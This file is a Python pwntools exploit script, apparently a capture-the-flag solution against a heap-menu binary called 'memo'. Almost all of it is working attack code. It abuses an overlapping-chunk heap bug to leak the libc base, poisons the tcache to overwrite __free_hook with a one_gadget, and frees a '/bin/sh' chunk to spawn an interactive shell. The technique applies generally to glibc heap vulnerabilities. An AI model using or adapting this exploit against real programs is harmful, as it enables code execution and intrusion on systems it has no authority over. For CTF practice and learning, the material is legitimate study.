#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

local = 1
host = '127.0.0.1' 
port = 10000
context.log_level = 'debug'
#context.terminal = "/home/noone/hyperpwn/hyperpwn-client.sh"
context.terminal =  ['mate-terminal','--geometry=94x60--10-26','--hide-menubar', '-x','sh','-c',]
exe = './memo'
context.binary = exe
elf = ELF(exe)
libc = elf.libc


#don't forget to change it
if local:
    io = process(exe)
else:
    io = remote(host,port)

s    = lambda data                                    : io.send(str(data))
sa   = lambda delim,data                              : io.sendafter(str(delim), str(data))
sl   = lambda data                                    : io.sendline(str(data))
sla  = lambda delim,data                              : io.sendlineafter(str(delim), str(data))
r    = lambda numb=4096                               : io.recv(numb)
rl   = lambda                                         : io.recvline().strip()
ru   = lambda delim,drop=True                         : io.recvuntil(delim, drop)
rg   = lambda regex                                   : io.recvregex(regex)
rp   = lambda timeout=1                               : io.recvrepeat(timeout)
uu32 = lambda data                                    : u32(data.ljust(4, '\x00'))
uu64 = lambda data                                    : u64(data.ljust(8, '\x00'))
lg   = lambda s,addr                                  : io.success('\033[1;31;40m%20s--> 0x%x\033[0m'%(s,addr))
ga   = lambda job=""                                  : gdb.attach(io, job) if local else 0
ia   = lambda                                         : io.interactive()

# break on aim addr
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(io,"b *{}".format(hex(addr)))

# get_one_gadget
def get_one_gadget(filename):
    try:
        import subprocess
    except Exception as e:
        print("subprocess not install")
        exit(0)
    return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))



#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
def c(idx):
    sla("> ", idx)

def new(size, content):
    c(1)
    sla(": ", size)
    if len(content) == size:
        sa(": ", content)
    else:
        sla(": ", content)

def edit(idx, content):
    c(2)
    sla(": ", idx)
    sla(": ", content)

def show(idx):
    c(4)
    sla(": ", idx)

def delete(idx):
    c(3)
    sla(": ", idx)

def get_libc(idx):
    show(idx)
    ru("content: ")
    return uu64(r(6))

def exp(host, rce=False):
    if rce:
        one_gadget = get_one_gadget(libc.path)

    for i in range(6):
        new(0xf0, str(i)*0xf0)
    new(0x4f0, '6'*0x4f0)
    new(0x30, '7'*0x30)
    new(0x4f0, '8'*0x4f0)
    new(0xf0, '9'*0xf0)

    for i in range(6):
        delete(i)
    delete(9)
    delete(6)
    delete(7)

    new(0x38, "0"*0x30 + p64(0x540)) #0
    delete(8)
    new(0x4f0, '1'*0x4f0) #1
    libc.address = get_libc(0) - 0x3ebca0
    lg("libc", libc.address)
    
    new(0x68, "2222") #2 -- 0
    delete(0)
    edit(2, p64(libc.sym['__free_hook']))
    new(0x68, '/bin/sh\x00') #0
    new(0x68, p64(libc.address + one_gadget[1]))#3
    delete(0)
    #ga()
    '''                         
    try:
        from LibcSearcher import *
    except Exception as e:
        print("subprocess not install")
        exit(0)        
    obj = LibcSearcher("fgets",leak_addr)
    libc_base = leak_addr - obj.dump("fgets")  
    system_addr = libc_base + obj.dump("system")
    malloc_hook = libc_base + obj.dump("__malloc_hook")
    free_hook = libc_base + obj.dump("__free_hook")
    bin_sh_addr = libc_base + obj.dump("str_bin_sh")
    '''
    ia()

if __name__ == '__main__':
    exp(host,True)

